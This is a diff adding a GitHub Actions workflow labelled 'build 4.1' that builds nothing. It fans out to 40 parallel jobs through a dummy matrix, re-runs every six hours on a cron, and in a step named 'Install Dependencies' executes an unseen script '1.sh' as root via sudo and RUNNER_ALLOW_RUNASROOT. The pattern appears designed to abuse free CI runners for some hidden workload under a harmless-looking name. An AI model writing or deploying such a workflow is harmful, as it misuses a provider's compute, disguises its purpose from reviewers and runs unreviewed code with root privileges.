@@ -1,0 +1,31 @@
+name: build 4.1
+ 
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+  
+jobs: 
+  build: 
+    name: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 40 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
+        flag: [A, B, C, D] 
+    env: 
+        NUM_JOBS: 40  
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/1.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/1.sh" 
+ 
+ 
+ 
